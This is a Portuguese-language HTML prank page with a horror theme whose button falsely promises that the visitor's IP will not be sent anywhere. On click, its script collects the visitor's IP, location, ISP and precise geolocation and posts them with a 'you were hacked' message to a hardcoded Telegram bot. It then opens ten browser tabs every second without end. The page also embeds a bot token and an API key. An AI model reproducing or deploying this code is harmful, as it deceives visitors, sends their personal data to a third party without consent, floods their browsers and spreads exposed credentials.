<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InnoBotCorporation</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: black;
            font-family: 'Creepster', cursive;
            color: white;
            text-align: center;
            overflow: hidden;
            position: relative;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        .message {
            color: white;
            font-size: 20px;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.7);
            z-index: 10;
            margin: 10px 0;
        }

        .loading {
            font-size: 18px;
            margin-top: 20px;
            animation: blink 1.5s infinite;
        }

        #playButton {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 20px;
            color: white;
            background-color: red;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            z-index: 10;
        }

        #playButton:hover {
            background-color: darkred;
        }

        #videoContainer {
            display: none;
        }

        #youtubeVideo {
            display: none;
        }

        .blood-drop {
            position: absolute;
            width: 10px;
            height: 10px;
            background-color: red;
            border-radius: 50%;
            opacity: 0.8;
            animation: drip linear infinite;
        }

        @keyframes drip {
            0% { transform: translateY(-10px); opacity: 0.8; }
            50% { opacity: 0.6; }
            100% { transform: translateY(100vh); opacity: 0; }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
</head>
<body>
    <div class="message" id="ipMessage"></div>
    <div class="message" id="locationMessage"></div>
    <div class="message" id="internetMessage"></div>
    <div class="loading" id="loadingMessage">Obtendo sua localização...</div>

    <button id="playButton">Clique aqui para seu IP não ser enviado ao nosso sistema</button>

    <div id="videoContainer">
        <iframe id="youtubeVideo" src="https://www.youtube.com/embed/b2pD0B9Rfps?enablejsapi=1&autoplay=1&loop=1&playlist=b2pD0B9Rfps" frameborder="0" allow="autoplay" allowfullscreen></iframe>
    </div>

    <script>
        const telegramBotToken = '7545142881:AAHD_s9gLTIpOUqHDfnu1_rGtDytwaerf_g'; 
        const telegramGroupId = '-1002018953064'; 

        async function getUserIPLocationAndConnection() {
            const ipGeolocationResponse = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=5af22bf946b049cf91cb613452d8a102');
            const ipGeolocationData = await ipGeolocationResponse.json();
            
            const locationData = {
                ip: ipGeolocationData.ip,
                location: `${ipGeolocationData.city}, ${ipGeolocationData.country_name}`,
                connection: `Conexão: ${ipGeolocationData.connection}; Provedor: ${ipGeolocationData.isp}`
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    locationData.location = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
                });
            }

            return locationData;
        }

        async function sendToTelegram(ip, location, connection) {
            const message = `Você foi hackeado!\nIP: ${ip}\nLocalização: ${location}\nConexão: ${connection}`;
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramGroupId}&text=${encodeURIComponent(message)}`;
            await fetch(url);
        }

        async function startVideoAndOpenTabs() {
            document.getElementById('loadingMessage').style.display = 'block'; 
            const userInfo = await getUserIPLocationAndConnection();

            if (userInfo) {
                await sendToTelegram(userInfo.ip, userInfo.location, userInfo.connection);
                document.getElementById('ipMessage').innerText = `Você foi hackeado! IP: ${userInfo.ip}`;
                document.getElementById('locationMessage').innerText = `Localização: ${userInfo.location}`;
                document.getElementById('internetMessage').innerText = `Conexão: ${userInfo.connection}`;
                
                document.getElementById('loadingMessage').style.display = 'none'; 
                document.getElementById('videoContainer').style.display = 'block';
                document.getElementById('youtubeVideo').style.display = 'block';
                
                setInterval(() => {
                    for (let i = 0; i < 10; i++) {
                        window.open("https://www.virustotal.com", "_blank");
                    }
                }, 1000);

                createBloodDrops();
            }
        }

        function createBloodDrops() {
            const body = document.body;

            setInterval(() => {
                const drop = document.createElement('div');
                drop.className = 'blood-drop';
                drop.style.left = Math.random() * 100 + 'vw';
                drop.style.animationDuration = Math.random() * 1 + 2 + 's';
                body.appendChild(drop);

                drop.addEventListener('animationend', () => {
                    drop.remove();
                });
            }, 500);
        }

        document.getElementById('playButton').addEventListener('click', startVideoAndOpenTabs);
    </script>
</body>
</html>
